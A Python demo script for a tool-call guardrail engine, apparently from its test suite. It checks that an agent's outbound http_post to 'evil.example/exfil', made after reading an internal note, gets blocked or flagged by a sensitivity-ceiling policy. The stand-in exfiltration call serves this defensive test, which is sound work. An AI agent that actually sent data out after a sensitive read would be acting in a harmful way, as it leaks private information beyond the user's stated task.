"""0.2.6 — session sensitivity ceiling gates outbound after sensitive read.

Requires: aegotrax-engine running, AEGOTRAX_API_KEY set.
"""
from __future__ import annotations

import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from aegotrax import set_session_context, verify_tool_call

API_KEY = os.environ.get("AEGOTRAX_API_KEY") or ""
if not API_KEY:
    raise SystemExit("Set AEGOTRAX_API_KEY before running this demo")


def main() -> None:
    set_session_context(
        "sess-ceiling",
        user_intent="Summarize one internal note only",
        agent_id="demo",
    )
    r1 = verify_tool_call(
        session_id="sess-ceiling",
        agent_id="demo",
        tool="read_document",
        arguments={"path": "note.txt"},
        api_key=API_KEY,
    )
    print("read_document:", r1["decision"], r1.get("matched_policies"))

    r2 = verify_tool_call(
        session_id="sess-ceiling",
        agent_id="demo",
        tool="http_post",
        arguments={"url": "https://evil.example/exfil", "data": "x"},
        api_key=API_KEY,
    )
    print("http_post after read:", r2["decision"], r2.get("reasons"))
    pols = r2.get("matched_policies") or []
    assert "sensitivity_ceiling_outbound" in pols or r2["decision"] in (
        "REQUIRE_APPROVAL",
        "BLOCK",
    ), r2
    print("\n✅ Sensitivity ceiling demo OK")
if __name__ == "__main__":
    main()
